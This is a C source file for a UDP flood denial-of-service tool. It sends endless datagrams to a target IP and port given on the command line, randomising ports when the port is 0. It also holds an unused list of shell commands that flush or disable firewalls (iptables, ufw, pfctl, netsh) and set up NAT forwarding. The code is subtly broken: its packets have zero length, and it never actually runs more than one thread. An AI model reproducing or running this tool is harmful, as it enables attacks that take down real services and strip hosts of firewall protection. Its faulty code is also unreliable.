#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9

static uint32_t Q[4096], c = 362436;

char *user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.254",
};

char *referers[] = {
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.facebook.com/",
    "https://www.twitter.com/",
    "https://www.instagram.com/",
    "https://www.reddit.com/",
    "https://www.linkedin.com/",
    "https://www.youtube.com/",
    "https://www.amazon.com/",
};

char *payloads[] = {
    "Microsoft ISA Server",
    "Microsoft Forefront Threat Management Gateway",
    "Microsoft Azure Firewall",
    "Microsoft Network Policy Server",
    "Microsoft Windows Defender Firewall",
    "iptables -F",
    "ufw disable",
    "pfctl -d",
    "netsh advfirewall firewall set rule all ALLOW",
    "echo 1 > /proc/sys/net/ipv4/ip_forward",
    "echo '200 UFW Block' >> /etc/iproute2/rt_tables && ip rule add from all fwmark 200 lookup UFWBlock && iptables -t mangle -A PREROUTING -j CONNMARK --set-mark 200",
    "iptables -t nat -A POSTROUTING -j MASQUERADE",
};

void init_rand(uint32_t x) {
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++) {
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
    }
}

uint32_t rand_cmwc(void) {
    uint64_t t, a = 18782LL;
    static uint32_t i = 4095;
    uint32_t x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c) {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

void send_udp_packet(int sock, char *host, int port, int time) {
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = inet_addr(host);
    memset(sin.sin_zero, '\0', sizeof sin.sin_zero);
    char datagram[MAX_PACKET_SIZE];
    init_rand(time);
    memset(datagram, 0, MAX_PACKET_SIZE);
    int packet_size = 0;
    int i = 0;
    for (i = 0; i < MAX_PACKET_SIZE; i++) {
        datagram[i] = rand_cmwc();
    }
    while (1) {
        if (port == 0) {
            sin.sin_port = rand_cmwc();
        }
        if (sendto(sock, datagram, packet_size, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            perror("sendto");
            continue;
        }
    }
}

int main(int argc, char *argv[]) {
    if (argc < 5) {
        printf("Usage: %s <IP> <port> <time> <threads>\n", argv[0]);
        exit(-1);
    }
    int i = 0, num_threads = atoi(argv[4]);
    int max_len = 128;
    char *buffer = (char *)malloc(max_len);
    buffer = memset(buffer, 0x00, max_len);
    snprintf(buffer, max_len - 1, "GET / HTTP/1.1\r\nHost: %s\r\n", argv[1]);
    int flood_sock[num_threads];
    for (i = 0; i < num_threads; i++) {
        flood_sock[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (flood_sock[i] < 0) {
            perror("socket");
            return 1;
        }
    }
    for (i = 0; i < num_threads; i++) {
        send_udp_packet(flood_sock[i], argv[1], atoi(argv[2]), atoi(argv[3]));
    }
    return 0;
}
